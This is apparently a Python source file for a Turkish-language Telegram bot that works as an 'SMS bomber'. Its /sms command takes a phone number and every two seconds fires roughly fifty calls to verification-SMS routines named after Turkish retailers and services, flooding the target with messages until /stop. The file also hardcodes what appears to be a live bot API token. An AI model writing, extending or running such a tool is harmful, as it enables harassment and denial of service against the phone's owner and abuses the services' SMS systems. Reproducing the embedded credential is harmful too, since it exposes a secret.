import asyncio
import logging
from sms import SendSms
from aiogram import Bot, Dispatcher, types
from aiogram.types import Message
from aiogram.utils import executor
from concurrent.futures import ThreadPoolExecutor, wait
from os import getenv

API_TOKEN = '7107604320:AAEcx_S-aa8IwW8PiOWcAdNm_dAX0EczFX4'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
executor_thread = ThreadPoolExecutor(max_workers=50)

active_tasks = {}
status_counts = {}

@dp.message_handler(commands=["start"])
async def start_handler(message: Message):
    await message.answer("SMS botuna hoş geldiniz!\nKomutlar:\n/sms <numara>\n/stop\n/help")

@dp.message_handler(commands=["help"])
async def help_handler(message: Message):
    await message.answer("/sms <numara> - SMS göndermeye başla\n/stop - Göndermeyi durdur\n/help - Yardım")

@dp.message_handler(lambda message: message.text.startswith("/sms "))
async def sms_handler(message: Message):
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit() or len(args[1]) != 10:
        await message.reply("Lütfen geçerli bir telefon numarası girin (10 haneli).")
        return

    user_id = message.chat.id
    tel_no = args[1]
    status_counts[user_id] = {"basarili": 0, "basarisiz": 0}

    status_message = await message.reply("SMS gönderimi başlatılıyor...")

    async def spam_sms():
        send_sms = SendSms(tel_no)
        try:
            while user_id in active_tasks:
                loop = asyncio.get_event_loop()
                futures = [
                    loop.run_in_executor(executor_thread, send_sms.Akasya),
                    loop.run_in_executor(executor_thread, send_sms.Akbati),
                    loop.run_in_executor(executor_thread, send_sms.Ayyildiz),
                    loop.run_in_executor(executor_thread, send_sms.Baydoner),
                    loop.run_in_executor(executor_thread, send_sms.Beefull),
                    loop.run_in_executor(executor_thread, send_sms.Bim),
                    loop.run_in_executor(executor_thread, send_sms.Bisu),
                    loop.run_in_executor(executor_thread, send_sms.Bodrum),
                    loop.run_in_executor(executor_thread, send_sms.Clickme),
                    loop.run_in_executor(executor_thread, send_sms.Dominos),
                    loop.run_in_executor(executor_thread, send_sms.Englishhome),
                    loop.run_in_executor(executor_thread, send_sms.Evidea),
                    loop.run_in_executor(executor_thread, send_sms.File),
                    loop.run_in_executor(executor_thread, send_sms.Frink),
                    loop.run_in_executor(executor_thread, send_sms.Happy),
                    loop.run_in_executor(executor_thread, send_sms.Hayatsu),
                    loop.run_in_executor(executor_thread, send_sms.Hey),
                    loop.run_in_executor(executor_thread, send_sms.Hizliecza),
                    loop.run_in_executor(executor_thread, send_sms.Icq),
                    loop.run_in_executor(executor_thread, send_sms.Ipragaz),
                    loop.run_in_executor(executor_thread, send_sms.Istegelsin),
                    loop.run_in_executor(executor_thread, send_sms.Joker),
                    loop.run_in_executor(executor_thread, send_sms.KahveDunyasi),
                    loop.run_in_executor(executor_thread, send_sms.KimGb),
                    loop.run_in_executor(executor_thread, send_sms.Komagene),
                    loop.run_in_executor(executor_thread, send_sms.Koton),
                    loop.run_in_executor(executor_thread, send_sms.KuryemGelsin),
                    loop.run_in_executor(executor_thread, send_sms.Macro),
                    loop.run_in_executor(executor_thread, send_sms.Metro),
                    loop.run_in_executor(executor_thread, send_sms.Migros),
                    loop.run_in_executor(executor_thread, send_sms.Naosstars),
                    loop.run_in_executor(executor_thread, send_sms.Paybol),
                    loop.run_in_executor(executor_thread, send_sms.Pidem),
                    loop.run_in_executor(executor_thread, send_sms.Porty),
                    loop.run_in_executor(executor_thread, send_sms.Qumpara),
                    loop.run_in_executor(executor_thread, send_sms.Starbucks),
                    loop.run_in_executor(executor_thread, send_sms.Suiste),
                    loop.run_in_executor(executor_thread, send_sms.Taksim),
                    loop.run_in_executor(executor_thread, send_sms.Tasdelen),
                    loop.run_in_executor(executor_thread, send_sms.Tasimacim),
                    loop.run_in_executor(executor_thread, send_sms.Tazi),
                    loop.run_in_executor(executor_thread, send_sms.TiklaGelsin),
                    loop.run_in_executor(executor_thread, send_sms.ToptanTeslim),
                    loop.run_in_executor(executor_thread, send_sms.Ucdortbes),
                    loop.run_in_executor(executor_thread, send_sms.Uysal),
                    loop.run_in_executor(executor_thread, send_sms.Wmf),
                    loop.run_in_executor(executor_thread, send_sms.Yapp),
                    loop.run_in_executor(executor_thread, send_sms.YilmazTicaret),
                    loop.run_in_executor(executor_thread, send_sms.Yuffi)
                ]
                results = await asyncio.gather(*futures, return_exceptions=True)
                for result in results:
                    if isinstance(result, Exception):
                        status_counts[user_id]["basarisiz"] += 1
                    else:
                        status_counts[user_id]["basarili"] += 1
                await status_message.edit_text(
                    f"_____________________________\n"
                    f"| başarılı [{status_counts[user_id]['basarili']:^5}]       |\n"
                    f"| başarısız [{status_counts[user_id]['basarisiz']:^5}]     |\n"
                    f"|____________________________|"
                )
                await asyncio.sleep(2)
        except asyncio.CancelledError:
            pass

    active_tasks[user_id] = asyncio.create_task(spam_sms())

@dp.message_handler(commands=["stop"])
async def stop_handler(message: Message):
    user_id = message.chat.id
    task = active_tasks.pop(user_id, None)
    if task:
        task.cancel()
        await message.reply("SMS gönderimi durduruldu.")
    else:
        await message.reply("Zaten çalışmıyor.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    executor.start_polling(dp, skip_updates=True)